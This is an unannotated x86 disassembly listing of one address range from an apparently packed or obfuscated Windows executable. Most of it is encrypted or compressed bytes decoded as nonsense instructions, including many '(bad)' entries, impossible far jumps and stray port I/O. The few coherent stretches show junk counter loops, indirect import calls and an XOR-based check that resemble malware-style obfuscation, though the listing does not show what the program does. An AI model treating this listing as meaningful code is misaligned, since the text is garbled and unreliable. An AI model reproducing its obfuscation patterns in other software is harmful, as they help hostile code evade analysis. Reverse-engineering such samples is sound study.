  40718a:	int    0xeb
  40718c:	sahf   
  40718d:	data16 cs cmp cl,0xf1
  407192:	lahf   
  407193:	xor    eax,eax
  407195:	test   al,0x75
  407197:	mov    ds:0xe98a7909,eax
  40719c:	stos   DWORD PTR es:[edi],eax
  40719d:	mov    eax,ds:0x2b7a96fe
  4071a2:	gs push ecx
  4071a4:	sahf   
  4071a5:	push   0x871087bc
  4071aa:	ins    BYTE PTR es:[edi],dx
  4071ab:	xchg   edx,eax
  4071ac:	sbb    bh,BYTE PTR [esi+0x53ebead6]
  4071b2:	pusha  
  4071b3:	inc    ecx
  4071b4:	push   ds
  4071b5:	adc    DWORD PTR [edx-0x4],edx
  4071b8:	push   0xfffffff2
  4071ba:	std    
  4071bb:	sbb    al,0x32
  4071bd:	jbe    0x407178
  4071bf:	jmp    0x2e0:0xb7f7847a
  4071c6:	es jae 0x407159
  4071c9:	xchg   ecx,eax
  4071ca:	inc    esi
  4071cb:	dec    esi
  4071cc:	sub    eax,0xf5cf5293
  4071d1:	lds    eax,FWORD PTR [esi-0x4a595e94]
  4071d7:	sbb    al,0x63
  4071d9:	cli    
  4071da:	call   0xe5b3:0xa48dd7a7
  4071e1:	sar    BYTE PTR ds:0x7480e073,0x2e
  4071e8:	daa    
  4071e9:	or     edx,0xfffffff9
  4071ec:	pop    edx
  4071ed:	ficomp WORD PTR [edi]
  4071ef:	jmp    FWORD PTR [esi+0x2f]
  4071f2:	bound  ebp,QWORD PTR [eax]
  4071f4:	push   0x4dc03819
  4071f9:	cs in  eax,dx
  4071fb:	test   eax,0x40f38ecf
  407200:	inc    edx
  407201:	ficom  WORD PTR [esp+ebx*4]
  407204:	test   al,0x96
  407206:	and    eax,0xbe0dc321
  40720b:	in     al,dx
  40720c:	xchg   BYTE PTR [ebx],bl
  40720e:	aas    
  40720f:	lods   eax,DWORD PTR ds:[esi]
  407210:	pop    edi
  407211:	or     dh,BYTE PTR [edi]
  407213:	xadd   DWORD PTR ds:0xbb7991a1,edx
  40721a:	jno    0x40724a
  40721c:	push   ds
  40721d:	aaa    
  40721e:	push   ebx
  40721f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407220:	xor    BYTE PTR [esi],0x3f
  407223:	leave  
  407224:	mov    dl,0x4c
  407226:	mov    ah,0xdf
  407228:	and    ah,BYTE PTR [edi+0x30]
  40722b:	and    al,0x18
  40722d:	js     0x4071f5
  40722f:	fld    TBYTE PTR gs:[edi-0x2dddfdba]
  407236:	or     al,0x62
  407238:	retf   
  407239:	div    DWORD PTR [ebx+0x62]
  40723c:	aas    
  40723d:	repnz sub DWORD PTR [esi],edx
  407240:	addr16 pop ebx
  407242:	add    BYTE PTR [edi],bl
  407244:	push   ds
  407245:	cmp    BYTE PTR [edi*8-0x15ecaa6e],ch
  40724c:	fcomip st,st(6)
  40724e:	test   al,0xdb
  407250:	test   al,0x7d
  407252:	sahf   
  407253:	mov    edx,DWORD PTR [edx+0x19]
  407256:	sbb    BYTE PTR [edi],cl
  407258:	in     eax,0x7d
  40725a:	or     dh,BYTE PTR [eax+0x78197410]
  407260:	loope  0x40720e
  407262:	shl    DWORD PTR [edi-0x4e],0xeb
  407266:	sbb    DWORD PTR [edx],ebp
  407268:	xchg   ch,al
  40726a:	mov    ecx,0xa5f5e568
  40726f:	clc    
  407270:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407271:	(bad)  
  407272:	in     al,dx
  407273:	enter  0x7408,0xec
  407277:	add    eax,0xdee50c3c
  40727c:	push   ecx
  40727d:	jae    0x40721f
  40727f:	call   0xbc5f7f6d
  407284:	jnp    0x407267
  407286:	push   0x58138911
  40728b:	cdq    
  40728c:	sub    cl,BYTE PTR es:[edx]
  40728f:	sar    ah,0xcd
  407292:	in     al,dx
  407293:	fadd   DWORD PTR [ecx+0x6d9c2779]
  407299:	lahf   
  40729a:	mov    al,cl
  40729c:	or     eax,edx
  40729e:	std    
  40729f:	or     bh,BYTE PTR [edi]
  4072a1:	sub    BYTE PTR [edi+edi*4+0x3d],dh
  4072a5:	sbb    BYTE PTR [edi],cl
  4072a7:	push   ss
  4072a8:	push   eax
  4072a9:	es inc dh
  4072ac:	cmp    esi,DWORD PTR [eax+edx*4-0x48d8b037]
  4072b3:	in     al,dx
  4072b4:	push   0xbe02f24e
  4072b9:	imul   esi,DWORD PTR [ecx+0x5b09df70],0x97d68409
  4072c3:	xor    edi,ecx
  4072c5:	loop   0x407313
  4072c7:	fist   DWORD PTR [ecx-0x41]
  4072ca:	cdq    
  4072cb:	pop    ss
  4072cc:	or     ebp,DWORD PTR [ecx+0x14]
  4072cf:	loope  0x40732f
  4072d1:	leave  
  4072d2:	dec    eax
  4072d3:	xchg   ebp,eax
  4072d4:	ficom  WORD PTR [ebx-0x1c]
  4072d7:	loopne 0x407285
  4072d9:	dec    ebp
  4072da:	adc    eax,0x3f741fd9
  4072df:	les    edx,FWORD PTR [ecx+0x6]
  4072e2:	mov    ecx,0x39443331
  4072e7:	pop    eax
  4072e8:	imul   ecx,DWORD PTR [ecx+0x28489064],0x9b30250d
  4072f2:	fsub   QWORD PTR [esi+0x79]
  4072f5:	das    
  4072f6:	add    eax,0x1f7c56a1
  4072fb:	addr16 (bad) 
  4072fd:	scas   al,BYTE PTR es:[edi]
  4072fe:	enter  0x164c,0x3b
  407302:	or     ebx,DWORD PTR [ecx-0x61a5cfad]
  407308:	(bad)  
  407309:	jmp    0xd9cec134
  40730e:	jge    0x40736b
  407310:	sub    al,0x3f
  407312:	or     DWORD PTR [ebx+0x63],ecx
  407315:	icebp  
  407316:	mov    edx,0x6854c9c9
  40731b:	sub    ebx,esi
  40731d:	ja     0x40738c
  40731f:	push   ebx
  407320:	xlat   BYTE PTR ds:[ebx]
  407321:	mov    ah,0x81
  407323:	stc    
  407324:	jl     0x4072bb
  407326:	mov    ecx,0xd6021aba
  40732b:	icebp  
  40732c:	(bad)  
  40732e:	add    eax,0x6450ffb4
  407333:	push   ecx
  407334:	jno    0x4072f5
  407336:	jmp    0x58ae808d
  40733b:	xor    BYTE PTR [edx-0x51dd1d11],dl
  407341:	inc    ebx
  407342:	jmp    0xad85:0xdda26861
  407349:	push   ds
  40734a:	adc    eax,0x7f3c3be8
  40734f:	(bad)  
  407350:	adc    bh,BYTE PTR [ebx-0x42]
  407353:	inc    ebp
  407354:	push   0xe264fdba
  407359:	loopne 0x407362
  40735b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40735c:	pop    es
  40735d:	sub    esi,DWORD PTR [edi+0x56]
  407360:	dec    esi
  407361:	ss and al,0x39
  407364:	dec    edx
  407365:	xchg   ebx,eax
  407366:	push   0xffffffe9
  407368:	mov    BYTE PTR [edi],cl
  40736a:	dec    esi
  40736b:	das    
  40736c:	fstp   DWORD PTR [ebx+0x2bad3307]
  407372:	mov    esi,0x2e68edd2
  407377:	or     edi,DWORD PTR [ecx+0x43e8d02f]
  40737d:	inc    ebp
  40737e:	imul   esi,ebp,0xffffffc2
  407381:	(bad)  
  407382:	out    dx,eax
  407383:	adc    ebp,DWORD PTR [edi-0x28e661b1]
  407389:	cdq    
  40738a:	push   0xa186973
  40738f:	es pop ecx
  407391:	imul   ebx,DWORD PTR [edx-0x38cdadc9],0x824678f9
  40739b:	xlat   BYTE PTR ds:[ebx]
  40739c:	inc    DWORD PTR [esi-0x2]
  40739f:	call   esp
  4073a1:	sbb    ecx,DWORD PTR [eax-0x11]
  4073a4:	push   edx
  4073a5:	adc    al,0x21
  4073a8:	outs   dx,BYTE PTR ds:[esi]
  4073a9:	xor    BYTE PTR [esi],bh
  4073ab:	or     BYTE PTR [edi+0x54],0x8
  4073af:	adc    al,BYTE PTR [ecx-0x51310b74]
  4073b5:	xchg   BYTE PTR [edi-0x28],bh
  4073b8:	push   ebp
  4073b9:	leave  
  4073ba:	popf   
  4073bb:	retf   0xa0cf
  4073be:	dec    esi
  4073bf:	jp     0x4073bd
  4073c1:	xchg   edx,eax
  4073c2:	cmp    bl,ah
  4073c4:	pop    eax
  4073c5:	mov    ch,0xc8
  4073c7:	adc    eax,0x32d8b01e
  4073cc:	mov    ch,0xa2
  4073ce:	icebp  
  4073cf:	imul   dh
  4073d1:	push   esi
  4073d3:	add    al,0x4
  4073d5:	out    dx,eax
  4073d6:	data16 std 
  4073d8:	mov    bh,0xed
  4073da:	std    
  4073db:	retf   0x7e6
  4073de:	jle    0x40736f
  4073e0:	push   0x56670455
  4073e5:	mov    ds:0x16e2cd87,al
  4073eb:	aam    0xaa
  4073ed:	arpl   WORD PTR [esi-0xe],dx
  4073f0:	xor    BYTE PTR [edx+0x3a2e90ef],bl
  4073f6:	out    0x41,al
  4073f8:	jl     0x40742a
  4073fa:	clc    
  4073fb:	dec    esp
  4073fc:	loopne 0x40742a
  4073fe:	dec    ebp
  4073ff:	push   edi
  407400:	jb     0x407439
  407402:	daa    
  407403:	dec    eax
  407404:	xchg   ebp,eax
  407405:	sbb    DWORD PTR [eax-0x32],esi
  407408:	es ret 0x3a4f
  40740c:	inc    ebp
  40740d:	retf   
  40740e:	mov    eax,0x52323281
  407413:	loop   0x4073f1
  407415:	push   ebp
  407416:	inc    ebx
  407417:	adc    eax,DWORD PTR [ecx]
  407419:	test   BYTE PTR [ebx-0x5bfd0089],bl
  40741f:	add    BYTE PTR [esi+esi*1-0x4b8741b0],0xe4
  407427:	clc    
  407428:	call   0x2fe59381
  40742d:	and    edi,DWORD PTR [eax+esi*4]
  407430:	mov    al,BYTE PTR [ebp+0x6ef37c6]
  407436:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407437:	out    dx,al
  407438:	sub    ebp,ebx
  40743a:	in     al,dx
  40743b:	sub    BYTE PTR [ebx-0x57],cl
  40743e:	pop    eax
  40743f:	cmp    ecx,DWORD PTR [ebx]
  407441:	lds    edi,FWORD PTR [esi+0x2e]
  407444:	pop    ecx
  407445:	mov    BYTE PTR [ebx+0x28ebfc5f],bh
  40744b:	or     BYTE PTR [eax+0x1fc27e5b],dh
  407451:	sti    
  407452:	sub    DWORD PTR [edx-0x4c],ecx
  407455:	and    al,0xd8
  407457:	pop    edx
  407458:	push   edi
  407459:	call   0xdfacbb8d
  40745e:	(bad)
  407461:	(bad)  
  407462:	or     esi,DWORD PTR [eax+0x499edab]
  407468:	int    0xca
  40746a:	and    eax,edx
  40746c:	cld    
  40746d:	push   ebp
  40746e:	fcomp  QWORD PTR [edx-0x23bd3c2a]
  407474:	inc    ebx
  407475:	inc    ebx
  407476:	repz fst QWORD PTR [esi+esi*4+0x7e049ac5]
  40747e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40747f:	lds    ebx,FWORD PTR [eax]
  407481:	bound  edx,QWORD PTR [ebx-0x39]
  407484:	add    eax,0x433597
  407489:	pop    ss
  40748a:	add    BYTE PTR [eax],al
  40748c:	add    BYTE PTR [ebx+0x4335973d],al
  407492:	add    BYTE PTR [eax],al
  407494:	je     0x4074de
  40749a:	cmp    DWORD PTR ds:0x433597,0xc
  4074a1:	jne    0x4074b2
  4074a7:	push   0x26d7
  4074ac:	call   DWORD PTR ds:0x41218c
  4074b2:	cmp    DWORD PTR ds:0x433597,0xd
  4074b9:	jne    0x4074cc
  4074bf:	mov    ecx,DWORD PTR ds:0x433597
  4074c5:	dec    ecx
  4074c6:	mov    DWORD PTR ds:0x433597,ecx
  4074cc:	mov    ecx,DWORD PTR ds:0x433597
  4074d2:	dec    ecx
  4074d3:	mov    DWORD PTR ds:0x433597,ecx
  4074d9:	jmp    0x40748d
  4074de:	lea    eax,[ebp-0x18]
  4074e1:	not    DWORD PTR ds:0x4335ab
  4074e7:	mov    DWORD PTR [ebp-0x1c],eax
  4074ea:	add    DWORD PTR ds:0x4335ab,ecx
  4074f0:	jmp    0x407866
  4074f5:	xchg   esi,eax
  4074f6:	je     0x407544
  4074f8:	cwde   
  4074f9:	outs   dx,BYTE PTR ds:[esi]
  4074fa:	mov    al,ds:0x62ca7272
  4074ff:	mov    cl,0xe2
  407501:	mov    ds:0x56fc8def,eax
  407506:	enter  0x7c7c,0xd7
  40750a:	jns    0x407588
  40750c:	jl     0x4074b3
  40750e:	xor    eax,0xcd922ab3
  407513:	jne    0x4074a8
  407515:	add    esp,0xffffffa2
  407518:	mov    eax,edx
  40751a:	pop    ss
  40751b:	dec    edi
  40751c:	loopne 0x407549
  40751e:	xor    DWORD PTR [esi+edx*1],edx
  407521:	pop    ebx
  407522:	dec    eax
  407523:	add    al,0x8a
  407525:	repnz adc eax,0x15632d7f
  40752b:	in     eax,0xd2
  40752d:	scas   eax,DWORD PTR es:[edi]
  40752e:	pop    esi
  40752f:	sub    al,0x1d
  407531:	pop    edx
  407532:	inc    edx
  407533:	push   ebp
  407534:	fmul   QWORD PTR ds:0x988f14eb
  40753a:	ret    
  40753b:	sub    eax,0xc7070e6d
  407540:	jo     0x4074e4
  407542:	mov    BYTE PTR [ebx+0x30],0xb7
  407546:	retf   0x9bcc
  407549:	(bad)  
  40754b:	stos   DWORD PTR es:[edi],eax
  40754c:	push   ss
  40754d:	ror    DWORD PTR [edx-0x5c0e396],1
  407553:	mov    bl,BYTE PTR [ecx-0x22851629]
  407559:	out    dx,eax
  40755a:	cld    
  40755b:	xor    DWORD PTR [edi+0x354c6c1e],esi
  407561:	aas    
  407562:	add    DWORD PTR [edi+0x56],esi
  407565:	push   ecx
  407566:	stc    
  407567:	mov    al,ds:0x8594975f
  40756c:	mov    al,0x54
  40756e:	inc    esi
  40756f:	jmp    0x937e9bfd
  407574:	out    0x22,eax
  407576:	sti    
  407577:	dec    edi
  407578:	fdiv   QWORD PTR [esi-0x56]
  40757b:	or     al,0x9a
  40757d:	and    eax,0x59982a1b
  407582:	inc    esi
  407583:	(bad)  
  407584:	icebp  
  407585:	jl     0x407511
  407587:	jbe    0x407581
  407589:	dec    ecx
  40758a:	inc    edx
  40758b:	sti    
  40758c:	cld    
  40758d:	outs   dx,DWORD PTR ds:[esi]
  40758e:	idiv   DWORD PTR [ebx+0x0]
  407591:	xchg   esi,eax
  407592:	bound  ecx,QWORD PTR [esi+0x63]
  407595:	mov    esp,0x49f5f64
  40759a:	iret   
  40759b:	mov    ds:0xfdbde5d6,eax
  4075a0:	imul   edi,DWORD PTR [ecx],0x31ee942a
  4075a6:	cmp    eax,DWORD PTR [ebp-0x7847f463]
  4075ac:	mov    ch,0xef
  4075ae:	sub    BYTE PTR [esi-0x403a0f02],ch
  4075b4:	push   esp
  4075b5:	fbld   TBYTE PTR [eax]
  4075b7:	xchg   ebp,eax
  4075b8:	adc    DWORD PTR [esi+esi*2],esp
  4075bb:	push   edi
  4075bc:	jmp    0x407602
  4075be:	push   0xb0f17eb
  4075c3:	cmp    bl,BYTE PTR [ebx]
  4075c5:	xor    DWORD PTR fs:[edi-0x6c],ebx
  4075c9:	out    dx,eax
  4075ca:	sahf   
  4075cb:	loopne 0x4075b5
  4075cd:	dec    edx
  4075ce:	(bad)  
  4075cf:	jle    0x407596
  4075d1:	pop    ecx
  4075d2:	pusha  
  4075d3:	jbe    0x407596
  4075d5:	xor    al,0xa4
  4075d7:	push   ds
  4075d8:	jae    0x4075f4
  4075da:	inc    ebp
  4075db:	pop    ss
  4075dc:	dec    esp
  4075dd:	pop    es
  4075de:	sbb    dl,BYTE PTR [esi-0x1]
  4075e1:	jecxz  0x407580
  4075e3:	push   ds
  4075e4:	loope  0x4075b6
  4075e6:	jo     0x40765a
  4075e8:	int3   
  4075e9:	rcl    BYTE PTR [edi],1
  4075eb:	jae    0x4075d4
  4075ed:	push   esp
  4075ee:	dec    esi
  4075ef:	rcr    ebp,cl
  4075f1:	mov    bh,0x46
  4075f3:	dec    esp
  4075f4:	clc    
  4075f5:	jmp    0x4c81:0x28c43487
  4075fc:	xor    al,0x27
  4075fe:	ja     0x4075bf
  407600:	test   eax,0x58feb66a
  407605:	fs mov bl,0xb
  407608:	mov    esi,0xb2995bb4
  40760d:	xor    ch,al
  40760f:	cld    
  407610:	adc    DWORD PTR [ebx+0x3d4fcb9d],ecx
  407616:	(bad)  
  407617:	or     eax,0xbda3073e
  40761c:	jmp    0x8cb93cc9
  407621:	test   al,0xae
  407623:	or     bh,BYTE PTR [esi-0x54c63442]
  407629:	pop    ebx
  40762a:	adc    dh,BYTE PTR [esi]
  40762c:	sub    DWORD PTR [edi-0x3ad375da],0x229f1182
  407636:	out    0xd1,eax
  407638:	mov    eax,0xa670e8d7
  40763d:	daa    
  40763e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40763f:	outs   dx,BYTE PTR ds:[esi]
  407640:	and    bl,ch
  407642:	in     eax,dx
  407643:	mov    edx,0x4e66298
  407648:	jnp    0x4075ec
  40764a:	adc    al,0x71
  40764c:	dec    ebp
  40764d:	call   0xb9a5ca87
  407652:	and    BYTE PTR [edi-0x1e],ah
  407655:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407656:	ret    0xf316
  407659:	add    eax,0xe9f0f26d
  40765e:	ins    DWORD PTR es:[edi],dx
  40765f:	pop    edi
  407660:	out    dx,eax
  407661:	pusha  
  407662:	sbb    eax,0x56e5994f
  407667:	xchg   esi,eax
  407668:	add    BYTE PTR [edi],dl
  40766a:	cmp    eax,0x398d9182
  40766f:	xchg   edi,eax
  407670:	(bad)  
  407671:	lods   al,BYTE PTR ds:[esi]
  407672:	lea    ebp,[eax-0x38233778]
  407678:	jmp    0x72ad:0xb8b5
  40767e:	aaa    
  40767f:	leave  
  407680:	adc    eax,0xc950ce86
  407685:	cmp    eax,0x2f56f35c
  40768a:	adc    eax,0xfe31deee
  40768f:	jp     0x40764f
  407691:	dec    esp
  407692:	mov    WORD PTR [ebx+0x6929d420],?
  407698:	cmp    al,0x3c
  40769a:	and    DWORD PTR ds:0x96eb94de,0x1b07667
  4076a4:	mov    ebp,0x8c3b2b6c
  4076a9:	cmc    
  4076aa:	and    BYTE PTR [edi+0x406a2a3f],ch
  4076b0:	xchg   DWORD PTR [esi+0x6d73bd6e],esi
  4076b6:	ficom  DWORD PTR [edi]
  4076b8:	sti    
  4076b9:	les    ebp,FWORD PTR [ecx]
  4076bb:	mov    ch,0xf4
  4076bd:	and    eax,0xe99464b1
  4076c2:	cmp    DWORD PTR [edi+0x1e],eax
  4076c5:	(bad)  
  4076c6:	in     eax,dx
  4076c7:	adc    DWORD PTR [esi-0x4a861b16],ebp
  4076cd:	retf   
  4076ce:	mov    ch,0x25
  4076d0:	mov    cl,0xc6
  4076d2:	xchg   ebp,esi
  4076d4:	jbe    0x40771b
  4076d6:	in     al,dx
  4076d7:	push   eax
  4076d8:	jecxz  0x4076b1
  4076da:	mov    eax,0xd21958cd
  4076df:	dec    esi
  4076e0:	xchg   esi,eax
  4076e1:	push   esi
  4076e2:	inc    eax
  4076e3:	jbe    0x407722
  4076e5:	gs cmp eax,0x5d40169b
  4076eb:	mov    ds:0x5d70c6b8,al
  4076f0:	psubd  mm3,QWORD PTR [ebp+0x73]
  4076f4:	icebp  
  4076f5:	jge    0x4076a6
  4076f7:	in     al,0xf7
  4076f9:	pop    ss
  4076fa:	retf   0x8513
  4076fd:	btc    DWORD PTR [esi+0x4],edx
  407701:	outs   dx,DWORD PTR ds:[esi]
  407702:	mov    al,ds:0x31912a7f
  407707:	fadd   QWORD PTR [esi]
  407709:	sti    
  40770a:	pop    es
  40770b:	(bad)  
  40770c:	cmp    esp,DWORD PTR [eax+0x5f]
  40770f:	cwde   
  407710:	cmp    eax,0xff99ea7
  407715:	mov    DWORD PTR [ebp+0x56],0x8fa5ddd2
  40771c:	shl    BYTE PTR [ebp+0x16],0x8
  407720:	pop    ecx
  407721:	arpl   WORD PTR [edx-0x16fd6d8a],bp
  407727:	xor    esi,esp
  407729:	mov    eax,ds:0x3052c082
  40772e:	in     al,0xd8
  407730:	in     eax,dx
  407731:	push   ebx
  407732:	dec    esp
  407733:	mov    bl,0x93
  407735:	jmp    0x398d856d
  40773a:	(bad)  
  40773c:	bound  edi,QWORD PTR [eax]
  40773e:	or     DWORD PTR [edx-0x3],ebp
  407741:	stc    
  407742:	jp     0x4076cb
  407744:	jecxz  0x407725
  407746:	and    dh,BYTE PTR [edx-0x784220b5]
  40774c:	push   eax
  40774d:	ret    0x8dd7
  407750:	pop    es
  407751:	mov    esi,0xb260b12c
  407756:	sbb    bh,BYTE PTR [edi]
  407758:	mov    ?,WORD PTR [edx-0x56]
  40775b:	mov    edi,0xc15bc42e
  407760:	fsub   st,st(2)
  407762:	jl     0x4077b4
  407764:	cwde   
  407765:	and    DWORD PTR [esi-0x63],ecx
  407768:	rol    DWORD PTR [edx+ebx*8],0x4e
  40776c:	push   ebp
  40776d:	push   ss
  40776e:	or     esi,DWORD PTR [esi+0x60]
  407771:	adc    BYTE PTR [ebx+0xf1794e5],0x19
  407778:	inc    edx
  407779:	xchg   edi,eax
  40777a:	jae    0x4077d2
  40777c:	stos   BYTE PTR es:[edi],al
  40777d:	and    al,0xc5
  40777f:	sub    BYTE PTR [edx-0x4f],cl
  407782:	aam    0xa8
  407784:	es sub al,0x7b
  407787:	sahf   
  407788:	pop    edx
  407789:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40778b:	pop    ds
  40778c:	sub    dl,dl
  40778e:	outs   dx,DWORD PTR ds:[esi]
  40778f:	push   edx
  407790:	retf   
  407791:	mov    ecx,0x71872f3e
  407796:	mov    ecx,0xa974f3a5
  40779c:	xchg   ecx,eax
  40779d:	cmp    ebx,ebp
  40779f:	scas   eax,DWORD PTR es:[edi]
  4077a0:	js     0x407743
  4077a2:	scas   eax,DWORD PTR es:[edi]
  4077a3:	out    0x75,eax
  4077a5:	stos   DWORD PTR es:[edi],eax
  4077a6:	dec    ebx
  4077a7:	mov    eax,0xfd56a443
  4077ac:	fs retf 0x308e
  4077b0:	sbb    al,0xa1
  4077b2:	arpl   WORD PTR [edi+0x70a538bd],bx
  4077b8:	pop    ds
  4077b9:	test   eax,0x956d800f
  4077be:	sbb    eax,DWORD PTR [edx+edx*2+0x33b2433]
  4077c5:	bound  ebx,QWORD PTR [ebp-0x2b1e9563]
  4077cb:	mov    DWORD PTR [ebp+0x3e],esi
  4077ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077cf:	and    dl,dl
  4077d1:	mov    ah,0x8e
  4077d3:	lods   eax,DWORD PTR ds:[esi]
  4077d4:	jle    0x407844
  4077d6:	neg    BYTE PTR gs:[ecx+0x56]
  4077da:	retf   
  4077db:	add    al,0x85
  4077dd:	fldenv [eax-0x20f7878b]
  4077e3:	in     eax,0x52
  4077e5:	fwait
  4077e6:	shl    bl,cl
  4077e8:	jo     0x407843
  4077ea:	jb     0x40777e
  4077ec:	fwait
  4077ed:	test   al,0x9
  4077ef:	xchg   ecx,eax
  4077f0:	xchg   ecx,eax
  4077f1:	sbb    bl,BYTE PTR [eax+0x4d]
  4077f4:	dec    ebx
  4077f5:	mov    cl,0x2f
  4077f7:	out    0x4d,al
  4077f9:	ror    cl,0xbf
  4077fc:	inc    esp
  4077fd:	mov    ah,BYTE PTR [ecx]
  4077ff:	jl     0x407847
  407801:	xor    ebp,DWORD PTR [ebp+0x423ecf15]
  407807:	imul   esi,DWORD PTR [ebp-0x6c],0x1692089a
  40780e:	cmp    dl,BYTE PTR [ecx+0x5e64f2cc]
  407814:	adc    eax,esp
  407816:	push   ss
  407817:	test   al,0x4a
  407819:	fcmovnbe st,st(5)
  40781b:	xor    ch,bh
  40781d:	xor    ch,BYTE PTR [ecx+0x4c04b1ea]
  407823:	inc    eax
  407824:	xor    eax,0x28dc1f8b
  407829:	xchg   esp,eax
  40782a:	popf   
  40782b:	cmp    eax,DWORD PTR [edx]
  40782d:	bound  edx,QWORD PTR [esi-0x2]
  407830:	fstp   TBYTE PTR [edx+0x5e]
  407833:	pop    eax
  407834:	lods   al,BYTE PTR ds:[esi]
  407835:	(bad)  
  407836:	lods   al,BYTE PTR ds:[esi]
  407837:	xor    DWORD PTR [edx+0x67],esi
  40783a:	popa   
  40783b:	bound  esp,QWORD PTR [ecx-0x61b33c32]
  407841:	dec    edx
  407842:	sbb    DWORD PTR [eax-0x27],esp
  407845:	jmp    0x7edb:0xf2a44c71
  40784c:	and    ah,cl
  40784e:	jno    0x4077ed
  407850:	pusha  
  407851:	mov    al,ds:0xef1fda47
  407856:	aaa    
  407857:	loopne 0x40785c
  407859:	aam    0x5
  40785b:	mov    ds,WORD PTR [esi+0x51]
  40785e:	inc    ebx
  40785f:	test   ecx,ebp
  407861:	mov    eax,0xc84389ff
  407866:	mov    eax,DWORD PTR [ebp-0x1c]
  407869:	and    DWORD PTR ds:0x433617,0x0
  407873:	mov    ebx,DWORD PTR ds:0x433617
  407879:	inc    ebx
  40787a:	mov    DWORD PTR ds:0x433617,ebx
  407880:	cmp    DWORD PTR ds:0x433617,0x6
  407887:	jne    0x407896
  40788d:	push   DWORD PTR [ebp-0x28]
  407890:	call   DWORD PTR ds:0x412190
  407896:	cmp    DWORD PTR ds:0x433617,0x5
  40789d:	jne    0x4078b0
  4078a3:	mov    ebx,DWORD PTR ds:0x433617
  4078a9:	inc    ebx
  4078aa:	mov    DWORD PTR ds:0x433617,ebx
  4078b0:	cmp    DWORD PTR ds:0x433617,0x15
  4078b7:	jb     0x407873
  4078bd:	push   esi
  4078be:	and    DWORD PTR ds:0x43354b,edi
  4078c4:	push   edi
  4078c5:	and    DWORD PTR ds:0x4335eb,0x0
  4078cf:	jmp    0x4078e1
  4078d4:	mov    edi,DWORD PTR ds:0x4335eb
  4078da:	inc    edi
  4078db:	mov    DWORD PTR ds:0x4335eb,edi
  4078e1:	cmp    DWORD PTR ds:0x4335eb,0x18
  4078e8:	jae    0x4079ae
  4078ee:	cmp    DWORD PTR ds:0x4335eb,0x8
  4078f5:	jne    0x407918
  4078fb:	push   0x117a
  407900:	push   DWORD PTR [ebp-0x28]
  407903:	push   0x433814
  407908:	push   0x86e1
  40790d:	push   0x5408
  407912:	call   DWORD PTR ds:0x41225c
  407918:	cmp    DWORD PTR ds:0x4335eb,0x7
  40791f:	jne    0x407934
  407925:	xor    edi,edi
  407927:	xor    edi,DWORD PTR ds:0x4335eb
  40792d:	inc    edi
  40792e:	mov    DWORD PTR ds:0x4335eb,edi
  407934:	jmp    0x4078d4
  407939:	mov    DWORD PTR ds:0x43354b,0x19
  407943:	cmp    DWORD PTR ds:0x43354b,0x0
  40794a:	je     0x4079ae
  407950:	cmp    DWORD PTR ds:0x43354b,0x9
  407957:	jne    0x40796e
  40795d:	push   DWORD PTR [ebp-0x1c]
  407960:	push   0x6ccd
  407965:	push   DWORD PTR [ebp-0x10]
  407968:	call   DWORD PTR ds:0x4120c4
  40796e:	cmp    DWORD PTR ds:0x43354b,0xa
  407975:	jne    0x407988
  40797b:	mov    edi,DWORD PTR ds:0x43354b
  407981:	dec    edi
  407982:	mov    DWORD PTR ds:0x43354b,edi
  407988:	mov    edi,DWORD PTR ds:0x43354b
  40798e:	dec    edi
  40798f:	mov    DWORD PTR ds:0x43354b,edi
  407995:	jmp    0x407943
  40799a:	xor    edi,edi
  40799c:	add    edi,DWORD PTR ds:0x4335ef
  4079a2:	or     edi,DWORD PTR ds:0x433663
  4079a8:	mov    DWORD PTR ds:0x4335ef,edi
  4079ae:	mov    edi,0xf89f2dad
  4079b3:	and    DWORD PTR ds:0x4335b3,0x0
  4079bd:	jmp    0x4079cf
  4079c2:	mov    esi,DWORD PTR ds:0x4335b3
  4079c8:	inc    esi
  4079c9:	mov    DWORD PTR ds:0x4335b3,esi
  4079cf:	cmp    DWORD PTR ds:0x4335b3,0x1e
  4079d6:	jae    0x4079f7
  4079dc:	cmp    DWORD PTR ds:0x4335b3,0x2c
  4079e3:	jne    0x4079f2
  4079e9:	push   DWORD PTR [ebp-0x28]
  4079ec:	call   DWORD PTR ds:0x4120c8
  4079f2:	jmp    0x4079c2
  4079f7:	mov    DWORD PTR [eax],edi
  4079f9:	mov    eax,DWORD PTR [ebp-0x14]
  4079fc:	mov    ebx,DWORD PTR [ebp-0x8]
  4079ff:	mov    ecx,0x7510853
  407a04:	xor    eax,ecx
  407a06:	mov    esi,0x32729a
  407a0b:	xor    ebx,ecx
  407a0d:	xor    edx,edx
  407a0f:	add    eax,esi
  407a11:	add    ebx,esi
  407a13:	div    ebx
  407a15:	mov    edx,DWORD PTR [ebp-0x20]
  407a18:	mov    DWORD PTR [ebp-0x2c],0x4ec5
  407a1f:	cmp    eax,DWORD PTR [edx]
  407a21:	je     0x40936a
  407a27:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407a2e:	lea    eax,[ebp-0xc]
  407a31:	mov    DWORD PTR [ebp-0x10],eax
  407a34:	mov    eax,DWORD PTR [ebp-0x10]
  407a37:	mov    edx,DWORD PTR [eax]
  407a39:	jmp    0x407daf
  407a3e:	sub    eax,0xb2df1e8f
  407a43:	imul   ebp,ebp,0x58ddbe5d
  407a49:	or     BYTE PTR [edi+0x73],cl
  407a4c:	jno    0x407a1c
  407a4e:	sub    esp,edx
  407a50:	jl     0x407ace
  407a52:	xlat   BYTE PTR ds:[ebx]
  407a53:	jns    0x407ad1
  407a55:	jl     0x407a43
  407a57:	js     0x407a2d
  407a59:	jge    0x407a27
  407a5b:	lock mov al,0x2e
  407a5e:	mov    edi,0xb7a0cf04
  407a63:	sbb    cl,BYTE PTR [edi+ebx*4]
  407a66:	ins    DWORD PTR es:[edi],dx
  407a67:	or     eax,0xfdf92147
  407a6c:	das    
  407a6d:	dec    eax
  407a6e:	sub    eax,0xd5571dab
  407a73:	stos   DWORD PTR es:[edi],eax
  407a74:	and    DWORD PTR [esi+0x68],edx
